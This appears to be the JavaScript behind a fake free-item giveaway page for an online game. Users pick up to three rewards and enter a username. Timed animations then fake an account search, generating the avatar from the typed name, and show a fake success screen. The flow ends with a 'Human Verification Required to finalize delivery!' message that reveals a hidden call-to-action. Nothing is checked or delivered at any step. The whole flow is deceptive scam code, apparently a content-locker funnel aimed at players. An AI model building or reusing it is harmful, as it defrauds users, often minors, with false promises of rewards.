(() => {
    'use strict';

    const audios = {
        click: document.getElementById('clickSound'),
        ding: document.getElementById('dingSound'),
        success: document.getElementById('successSound'),
        verify: document.getElementById('verifySound')
    };
  
    const AC = window.AudioContext || window.webkitAudioContext;
    const ctx = AC ? new AC() : null;
    let unlocked = false;

    function unlock() {
        if (unlocked) return;
        unlocked = true;
        if (ctx && ctx.state === 'suspended') ctx.resume().catch(() => {});
        
        Object.values(audios).forEach(a => {
            if (!a) return;
            try {
                a.muted = true; 
                a.play().then(() => { 
                    a.pause(); 
                    a.currentTime = 0; 
                    a.muted = false; 
                }).catch(() => {});
            } catch (e) {}
        });
    }
    document.addEventListener('pointerdown', unlock, { once: true });

    function play(el, vol = 1) {
        if (!el) return;
        try { 
            el.pause(); 
            el.currentTime = 0; 
            el.volume = vol; 
            requestAnimationFrame(() => {
                el.play().catch(() => {});
            });
        } catch (e) {}
    }

    window.GAG_SFX = {
        click:   () => play(audios.click, 1),
        ding:    () => play(audios.ding, 1),
        success: () => play(audios.success, 1),
        verify:  () => play(audios.verify, 1),
        decline: () => {
            if (!ctx) { play(audios.click, 0.7); return; }
            const now = ctx.currentTime, osc = ctx.createOscillator(), gain = ctx.createGain();
            osc.type = 'sawtooth'; 
            osc.frequency.setValueAtTime(420, now); 
            osc.frequency.exponentialRampToValueAtTime(120, now + 0.25);
            gain.gain.setValueAtTime(0.001, now); 
            gain.gain.linearRampToValueAtTime(0.08, now + 0.02); 
            gain.gain.exponentialRampToValueAtTime(0.001, now + 0.3);
            osc.connect(gain).connect(ctx.destination); 
            osc.start(now); 
            osc.stop(now + 0.32);
        }
    };
})();

document.addEventListener('DOMContentLoaded', () => {
    const loader = document.getElementById('page-loader');
    if (loader) {
        setTimeout(() => {
            loader.classList.add('hide');
            document.documentElement.classList.remove('pl-lock');
            document.body.classList.remove('pl-lock');
            setTimeout(() => loader.remove(), 400);
        }, 800); 
    }

    const MAX_SECTIONS = 3;
    const slotsContainer = document.getElementById('slots');
    const continueBtn = document.getElementById('continue-btn');
    const imgContainers = document.querySelectorAll('#gallery .img-container');
    const galleryContainer = document.getElementById('gallery');
    
    let selectedItems = []; 
    let animatingCount = 0; 
    let isProcessing = false; 

    function updateGalleryState() {
        const total = selectedItems.length + animatingCount;
        if (total >= MAX_SECTIONS) {
            galleryContainer.classList.add('max-reached');
            document.body.classList.add('cap-reached');
        } else {
            galleryContainer.classList.remove('max-reached');
            document.body.classList.remove('cap-reached');
        }
    }

    // Intelligent pre-pooling phase
    imgContainers.forEach((card, index) => {
        card.setAttribute('data-index', index);
        
        const originalImg = card.querySelector('.pet');
        const originalCaption = card.querySelector('.img-caption');
        const petSrc = originalImg ? originalImg.src : '';

        const slotCard = document.createElement('div');
        slotCard.className = 'slot-card';
        
        const sImg = document.createElement('img');
        sImg.className = 'pet';
        sImg.setAttribute('decoding', 'async');
        sImg.setAttribute('width', '120');
        sImg.setAttribute('height', '120');
        sImg.src = petSrc; 
        
        const sCaption = document.createElement('div');
        sCaption.className = 'img-caption';
        sCaption.innerHTML = originalCaption ? originalCaption.innerHTML : '';
        
        slotCard.appendChild(sImg);
        slotCard.appendChild(sCaption);
        card.cachedSlotCard = slotCard; 

        const flyingElem = document.createElement('div');
        flyingElem.className = 'flying-element';
        flyingElem.style.cssText = "position:fixed; z-index:9999; will-change:transform, opacity; pointer-events:none; transition:none;";
        
        const innerContainer = document.createElement('div');
        innerContainer.style.cssText = "width:100%; height:100%; position:relative; overflow:hidden;";
        
        const flyPetImg = document.createElement('img');
        flyPetImg.className = 'pet';
        flyPetImg.setAttribute('decoding', 'async');
        flyPetImg.src = petSrc;
        flyPetImg.style.cssText = "position:absolute; top:50%; left:50%; transform:translate(-50%, -50%); width:90%; height:auto; object-fit:contain; z-index:2;";
        
        innerContainer.appendChild(flyPetImg);
        flyingElem.appendChild(innerContainer);
        card.cachedFlyingElem = flyingElem; 

        const thumbImg = document.createElement('img');
        thumbImg.className = 'pet';
        thumbImg.setAttribute('decoding', 'async');
        thumbImg.setAttribute('width', '60');
        thumbImg.setAttribute('height', '60');
        thumbImg.src = petSrc;
        card.cachedPopupThumb = thumbImg;

        const claimBtn = document.createElement('button');
        claimBtn.type = 'button';
        claimBtn.className = 'claim-btn';
        claimBtn.setAttribute('aria-label', 'Claim reward');
        claimBtn.innerHTML = '<span class="label">Claim</span>';
        card.appendChild(claimBtn);

        card.addEventListener('click', (e) => {
            e.stopPropagation();
            if (isProcessing) return; 

            if (card.classList.contains('selected')) {
                isProcessing = true; 
                deselectCard(card);
                window.GAG_SFX?.click?.();
                setTimeout(() => { isProcessing = false; }, 250); 
            } else {
                if (selectedItems.length + animatingCount >= MAX_SECTIONS) {
                    window.GAG_SFX?.decline?.();
                    slotsContainer.classList.add('shake');
                    setTimeout(() => slotsContainer.classList.remove('shake'), 350);
                    return;
                }
                
                const nextSlotIndex = selectedItems.length + animatingCount;
                const targetSlot = document.getElementById(`slot${nextSlotIndex + 1}`);

                if (targetSlot && originalImg) {
                    isProcessing = true; 
                    window.GAG_SFX?.ding?.();
                    animatingCount++;
                    card.classList.add('selected'); 
                    updateGalleryState();
                    
                    animateFlyEffect(card, targetSlot, nextSlotIndex + 1, () => {
                        animatingCount--;
                        selectCard(card);
                        isProcessing = false; 
                    });
                } else {
                    isProcessing = true;
                    window.GAG_SFX?.ding?.();
                    card.classList.add('selected');
                    selectCard(card);
                    setTimeout(() => { isProcessing = false; }, 200);
                }
            }
        });
    });

    // Fixed animation handler to prevent deviation and random position jumps
    function animateFlyEffect(sourceCard, targetSlot, targetSlotNum, onComplete) {
        const sourceRect = sourceCard.getBoundingClientRect();
        const targetRect = targetSlot.getBoundingClientRect();
        const flyingElem = sourceCard.cachedFlyingElem;

        if (!flyingElem) { onComplete(); return; }

        // Step 1: Force strict initial position with no transition properties
        flyingElem.style.transition = 'none';
        flyingElem.style.width = `${sourceRect.width}px`;
        flyingElem.style.height = `${sourceRect.height}px`;
        flyingElem.style.left = `${sourceRect.left}px`;
        flyingElem.style.top = `${sourceRect.top}px`;
        flyingElem.style.transform = 'translate3d(0,0,0) scale(1, 1)';
        flyingElem.style.opacity = '1';

        document.body.appendChild(flyingElem);

        // Trigger reflow to guarantee the browser registers initial positions before animating
        flyingElem.offsetHeight; 

        const frame = sourceCard.querySelector('.frame');
        if (frame) frame.setAttribute('data-used', 'true');

        const deltaX = targetRect.left - sourceRect.left;
        const deltaY = targetRect.top - sourceRect.top;
        const scaleX = targetRect.width / sourceRect.width;
        const scaleY = targetRect.height / sourceRect.height;

        // Step 2: Apply flight transforms in the next animation frame to prevent blending issues
        requestAnimationFrame(() => {
            flyingElem.style.transition = 'transform 0.38s cubic-bezier(0.25, 1, 0.5, 1), opacity 0.38s ease';
            flyingElem.style.transform = `translate3d(${deltaX}px, ${deltaY}px, 0) scale(${scaleX}, ${scaleY})`;
        });

        setTimeout(() => {
            flyingElem.remove(); 
            onComplete();
            
            const targetCard = document.getElementById(`slot${targetSlotNum}`);
            if (targetCard) {
                targetCard.classList.add('pop-effect');
                setTimeout(() => targetCard.classList.remove('pop-effect'), 400);
            }
        }, 380);
    }

    function selectCard(card) {
        if (selectedItems.includes(card) || selectedItems.length >= MAX_SECTIONS) return;
        selectedItems.push(card);
        renderSlots();
    }

    function deselectCard(card) {
        card.classList.remove('selected');
        const frame = card.querySelector('.frame');
        if (frame) frame.setAttribute('data-used', 'false');
        selectedItems = selectedItems.filter(item => item !== card);
        renderSlots();
    }

    function renderSlots() {
        for (let i = 1; i <= 3; i++) {
            const slot = document.getElementById(`slot${i}`);
            if (!slot) continue;

            const card = selectedItems[i - 1];

            if (card) {
                if (slot.firstElementChild !== card.cachedSlotCard) {
                    slot.innerHTML = ''; 
                    
                    card.cachedSlotCard.onclick = (e) => {
                        e.stopPropagation();
                        if (isProcessing) return; 
                        isProcessing = true;
                        deselectCard(card);
                        window.GAG_SFX?.click?.();
                        setTimeout(() => { isProcessing = false; }, 250);
                    };
                    
                    slot.appendChild(card.cachedSlotCard); 
                }
            } else {
                slot.innerHTML = '';
            }
        }

        const hasItems = selectedItems.length >= 1;
        continueBtn.hidden = !hasItems;
        continueBtn.style.display = hasItems ? 'block' : 'none';

        updateGalleryState();
    }

    const popup = document.getElementById('purchase-popup');
    const stepInput = document.getElementById('popup-step-input');
    const stepSearch = document.getElementById('popup-step-search');
    const stepSuccess = document.getElementById('popup-step-success');
    const stepVerify = document.getElementById('popup-step-verify');
    
    const popupThumbs = document.getElementById('popup-thumbs');
    const usernameInput = document.getElementById('popup-username');
    const userError = document.getElementById('popup-user-error');
    
    continueBtn.addEventListener('click', () => {
        window.GAG_SFX?.click?.();
        popup.style.display = 'flex';
        popup.setAttribute('aria-hidden', 'false');
        
        popupThumbs.innerHTML = '';
        selectedItems.forEach(card => {
            if (card.cachedPopupThumb) {
                popupThumbs.appendChild(card.cachedPopupThumb.cloneNode(true)); 
            }
        });

        stepInput.hidden = false;
        stepSearch.hidden = true;
        stepSuccess.hidden = true;
        stepVerify.hidden = true;
        userError.hidden = true;
        userError.style.display = 'none';
    });

    document.getElementById('popup-cancel').addEventListener('click', () => {
        window.GAG_SFX?.click?.();
        popup.style.display = 'none';
        popup.setAttribute('aria-hidden', 'true');
    });

    document.getElementById('popup-search').addEventListener('click', () => {
        const userVal = usernameInput.value.trim();
        if (!userVal) {
            window.GAG_SFX?.decline?.();
            userError.hidden = false;
            userError.style.display = 'block';
            return;
        }
        userError.hidden = true;
        userError.style.display = 'none';

        stepInput.hidden = true;
        stepSearch.hidden = false;
        window.GAG_SFX?.click?.();

        setTimeout(() => {
            stepSearch.hidden = true;
            stepSuccess.hidden = false;
            window.GAG_SFX?.success?.(); 
            
            document.getElementById('popup-username-label').textContent = userVal;
            document.getElementById('popup-avatar').src = `https://api.dicebear.com/7.x/adventurer/svg?seed=${encodeURIComponent(userVal)}`;
        }, 2500);
    });

    document.getElementById('edit-btn').addEventListener('click', () => {
        stepSuccess.hidden = true;
        stepInput.hidden = false;
        window.GAG_SFX?.click?.();
    });

    document.getElementById('locker-btn').addEventListener('click', () => {
        stepSuccess.hidden = true;
        stepVerify.hidden = false;
        window.GAG_SFX?.click?.();

        setTimeout(() => {
            const spinner = document.getElementById('verify-spinner');
            if (spinner) {
                spinner.hidden = true;
                spinner.style.display = 'none';
            }
            document.getElementById('verify-text').textContent = 'Human Verification Required to finalize delivery!';
            
            const ctaInline = document.getElementById('post-cta-inline');
            if (ctaInline) {
                ctaInline.hidden = false;
                ctaInline.style.display = 'block';
            }
            window.GAG_SFX?.verify?.(); 
        }, 2000);
    });
});

if ('serviceWorker' in navigator) {
    window.addEventListener('load', () => {
        navigator.serviceWorker.register('./sw.js').catch(err => console.log('SW registration skipped', err));
    });
}